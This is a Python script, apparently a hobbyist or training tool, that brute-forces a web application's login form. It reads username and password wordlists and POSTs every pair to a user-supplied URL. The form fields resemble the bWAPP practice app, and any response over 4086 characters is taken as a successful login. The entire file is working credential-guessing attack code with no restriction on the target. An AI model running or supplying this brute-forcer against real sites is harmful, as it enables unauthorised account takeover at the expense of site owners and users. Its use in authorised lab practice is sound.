#!/usr/bin/env python3

# importing the sys module so that we can
# use command line arguments for targetURL
import sys

# importing requests library to contact targetURL
import requests

# Banner
print("""
--------------------------------
    Web App Brute Force Tool    
--------------------------------""")

def caseCheck(args):
	match args[0]:
		case '-u':
			tURL = args[1]
			bagODonuts.insert(0, tURL) 
		case '-l':
			lNamesFile = args[1]
			bagODonuts.insert(1, lNamesFile)
		case '-w':
			pFile = args[1]
			bagODonuts.insert(2, pFile)
		case _:
			print("")
			print("--------------------------------------------------")
			print(f"[!] Invalid Option: >>>	{sys.argv[1]} {sys.argv[2]}")
			print("--------------------------------------------------")
			print("")

if len(sys.argv) == 7 and len(sys.argv) == len(set(sys.argv)):
	bagODonuts = []
	
	allArgs = sys.argv[1:]
	args12 = allArgs[0:2]
	args34 = allArgs[2:4]
	args56 = allArgs[4:]
	
	#caseCheck(args12)
	#caseCheck(args34)
	#caseCheck(args56)
	
	argListForCaseCheck = [args12, args34, args56]
	for a in argListForCaseCheck:
		caseCheck(a)

	targetURL = bagODonuts[0]
	loginNamesFile = bagODonuts[1]
	passwordsFile = bagODonuts[2]
else:	
	targetURL = input("[>] Enter Target URL: ")
	loginNamesFile = input("[>] Enter Login Names File: ")
	passwordsFile = input("[>] Enter Password File: ")

print(f"""
---------------------------------------
[*] Target URL: \33[42m{targetURL}\33[0m
[*] Login File: \33[45m{loginNamesFile}\33[0m
[*] Pass File:  \33[44m{passwordsFile}\33[0m
---------------------------------------
""")

# Opening loginNamesFile and passwordsFile
with open(loginNamesFile, encoding="utf-8") as LNF:
	loginNames = LNF.readlines()
with open(passwordsFile, encoding="utf-8") as PWF:
	passwords = PWF.readlines()

try:
	for name in loginNames:
		n = name.strip()
		print(f"[*] Trying Username: {n}")
		for word in passwords:
			w = word.strip()
			# POST Data = login=admin&password=123456789&security_level=0&form=submit
			r = requests.post(targetURL, data={'login': n, 'password': w, 'security_level': '0', 'form': 'submit'})
			#print(f"[*] Trying Creds ~> {n}")
			if len(r.text) > 4086:
				print(f"[!] SUCCESS!!! \33[41m{n}:{w}\33[0m")
				break

except:
	print("[!] Issue with Target URL")
	print("[!] Usage: ./brute-force.py http(s)://target-url")
	print("[!] CHECK YOUR URL!")
